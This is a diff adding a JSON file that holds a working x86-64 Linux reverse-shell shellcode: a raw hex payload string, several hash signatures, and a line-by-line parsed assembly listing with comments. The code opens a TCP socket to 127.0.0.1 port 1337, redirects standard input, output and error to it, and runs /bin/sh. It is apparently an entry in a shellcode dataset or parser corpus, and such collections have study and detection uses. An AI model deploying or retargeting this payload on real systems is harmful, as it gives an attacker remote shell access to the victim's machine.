@@ -1,0 +1,587 @@
+{
+    "payload": "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xf6\\x48\\x31\\xff\\x6a\\x01\\xb8\\x29\\x00\\x00\\x00\\xbf\\x02\\x00\\x00\\x00\\xbe\\x01\\x00\\x00\\x00\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc2\\xbb\\x80\\xff\\xff\\xfe\\x48\\x83\\xf3\\xff\\x53\\x66\\x68\\x05\\x39\\x66\\x6a\\x02\\xb8\\x2a\\x00\\x00\\x00\\x48\\x89\\xd7\\x48\\x89\\xe6\\xba\\x18\\x00\\x00\\x00\\x0f\\x05\\x48\\x89\\xf9\\xb8\\x21\\x00\\x00\\x00\\x48\\x89\\xcf\\x48\\x31\\xf6\\x0f\\x05\\xb8\\x21\\x00\\x00\\x00\\xbe\\x01\\x00\\x00\\x00\\x0f\\x05\\xb8\\x21\\x00\\x00\\x00\\xbe\\x02\\x00\\x00\\x00\\x0f\\x05\\x48\\x31\\xdb\\x48\\x31\\xc9\\x53\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe3\\x51\\x53\\xb8\\x3b\\x00\\x00\\x00\\x48\\x89\\xdf\\x48\\x89\\xe6\\x48\\x31\\xd2\\x0f\\x05",
+    "signatures": [
+        {
+            "sha256": "ad67550f902a145c815ed522f1cb32d86be5b73afae347a24cfd2b71788d7578",
+            "md5": "af7d922c6ecd3eec494ae6e7dcd3a93d"
+        },
+        {
+            "sha256": "a2ea1e0826be805cd21fe7075f38490d0eeab56719117dcaf7c4825d586238d2",
+            "md5": "0b94e646501efaf2f4971deb54801513"
+        },
+        {
+            "sha256": "82523e4ffbeec5079091fc7ff99221411b7eee966c1cee1e94ec5c12b44f80ca",
+            "md5": "6ed78b11af4841450819a35b72daf2e3"
+        },
+        {
+            "sha256": "b3af0b3701bd9ad9e5f291a20c144311f6b82ffc85c0efc47de3214ff1d9e50f",
+            "md5": "ccd1dced2452de382cb238f07089c207"
+        }
+    ],
+    "lines": [
+        {
+            "number": 0,
+            "instructions": {
+                "name": "BITS",
+                "arguments": [
+                    "64"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 1,
+            "instructions": {
+                "name": "SECTION",
+                "arguments": [
+                    ".text"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 2,
+            "instructions": {
+                "name": "global",
+                "arguments": [
+                    "_start"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 3,
+            "instructions": {
+                "name": "_start:",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 4,
+            "instructions": {},
+            "comments": " set registery to 0"
+        },
+        {
+            "number": 5,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rax",
+                    "rax"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 6,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rbx",
+                    "rbx"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 7,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rsi",
+                    "rsi"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 8,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rdi",
+                    "rdi"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 9,
+            "instructions": {},
+            "comments": "              SYS_SOCKET"
+        },
+        {
+            "number": 10,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "1"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 11,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "41"
+                ]
+            },
+            "comments": " sys_socket"
+        },
+        {
+            "number": 12,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdi",
+                    "2"
+                ]
+            },
+            "comments": " domain = 2 (AF_INET)"
+        },
+        {
+            "number": 13,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rsi",
+                    "1"
+                ]
+            },
+            "comments": " Type = 1 (SOCK_STREAM)"
+        },
+        {
+            "number": 14,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rdx",
+                    "rdx"
+                ]
+            },
+            "comments": " Protocol = 0 (TCP)"
+        },
+        {
+            "number": 15,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 16,
+            "instructions": {},
+            "comments": " Save return value of syscall"
+        },
+        {
+            "number": 17,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdx",
+                    "rax"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 18,
+            "instructions": {},
+            "comments": "               SYS_CONNECT"
+        },
+        {
+            "number": 19,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rbx",
+                    "0xfeffff80"
+                ]
+            },
+            "comments": " xor of 0x0100007f and 0xffffffff"
+        },
+        {
+            "number": 20,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rbx",
+                    "0xffffffff"
+                ]
+            },
+            "comments": " mov 0x0100007f in rbx"
+        },
+        {
+            "number": 21,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "rbx"
+                ]
+            },
+            "comments": " s_addr = 127.0.0.1"
+        },
+        {
+            "number": 22,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "word",
+                    "0x3905"
+                ]
+            },
+            "comments": " int port = 1337"
+        },
+        {
+            "number": 23,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "word",
+                    "0x2"
+                ]
+            },
+            "comments": " int family = AF_INET"
+        },
+        {
+            "number": 24,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "42"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 25,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdi",
+                    "rdx"
+                ]
+            },
+            "comments": " fd = return fd of sys_socket"
+        },
+        {
+            "number": 26,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rsi",
+                    "rsp"
+                ]
+            },
+            "comments": " *uservaddr = rsp (addr of start of struct)"
+        },
+        {
+            "number": 27,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdx",
+                    "24"
+                ]
+            },
+            "comments": " addrlen = 24"
+        },
+        {
+            "number": 28,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 29,
+            "instructions": {},
+            "comments": "               SYS_DUP2"
+        },
+        {
+            "number": 30,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rcx",
+                    "rdi"
+                ]
+            },
+            "comments": " save fd of socket"
+        },
+        {
+            "number": 31,
+            "instructions": {},
+            "comments": " STDIN"
+        },
+        {
+            "number": 32,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "33"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 33,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdi",
+                    "rcx"
+                ]
+            },
+            "comments": " newfd = socket fd"
+        },
+        {
+            "number": 34,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rsi",
+                    "rsi"
+                ]
+            },
+            "comments": " oldfd = 0 (STDIN)"
+        },
+        {
+            "number": 35,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 36,
+            "instructions": {},
+            "comments": " STDOUT"
+        },
+        {
+            "number": 37,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "33"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 38,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rsi",
+                    "1"
+                ]
+            },
+            "comments": " oldfd = 0 (STDIN)"
+        },
+        {
+            "number": 39,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 40,
+            "instructions": {},
+            "comments": " STDERR"
+        },
+        {
+            "number": 41,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "33"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 42,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rsi",
+                    "2"
+                ]
+            },
+            "comments": " oldfd = 0 (STDIN)"
+        },
+        {
+            "number": 43,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        },
+        {
+            "number": 44,
+            "instructions": {},
+            "comments": "               EXECVE /bin/sh"
+        },
+        {
+            "number": 45,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rbx",
+                    "rbx"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 46,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rcx",
+                    "rcx"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 47,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "rbx"
+                ]
+            },
+            "comments": " push 0x00"
+        },
+        {
+            "number": 48,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rbx",
+                    "0x68732F6E69622F2F"
+                ]
+            },
+            "comments": " \"//bin/sh\""
+        },
+        {
+            "number": 49,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "rbx"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 50,
+            "instructions": {},
+            "comments": " save \"//bin/sh\" addr"
+        },
+        {
+            "number": 51,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rbx",
+                    "rsp"
+                ]
+            },
+            "comments": ""
+        },
+        {
+            "number": 52,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "rcx"
+                ]
+            },
+            "comments": " push 0x00"
+        },
+        {
+            "number": 53,
+            "instructions": {
+                "name": "push",
+                "arguments": [
+                    "rbx"
+                ]
+            },
+            "comments": " push *char[] of \"//bin/sh\""
+        },
+        {
+            "number": 54,
+            "instructions": {},
+            "comments": " execve of \"//bin/sh\""
+        },
+        {
+            "number": 55,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rax",
+                    "59"
+                ]
+            },
+            "comments": " execve syscall (x86_64)"
+        },
+        {
+            "number": 56,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rdi",
+                    "rbx"
+                ]
+            },
+            "comments": " char* = \"//bin/sh\""
+        },
+        {
+            "number": 57,
+            "instructions": {
+                "name": "mov",
+                "arguments": [
+                    "rsi",
+                    "rsp"
+                ]
+            },
+            "comments": " *argv[] = \"//bin/sh\""
+        },
+        {
+            "number": 58,
+            "instructions": {
+                "name": "xor",
+                "arguments": [
+                    "rdx",
+                    "rdx"
+                ]
+            },
+            "comments": " *envp[] = 0"
+        },
+        {
+            "number": 59,
+            "instructions": {
+                "name": "syscall",
+                "arguments": []
+            },
+            "comments": ""
+        }
+    ]
+}
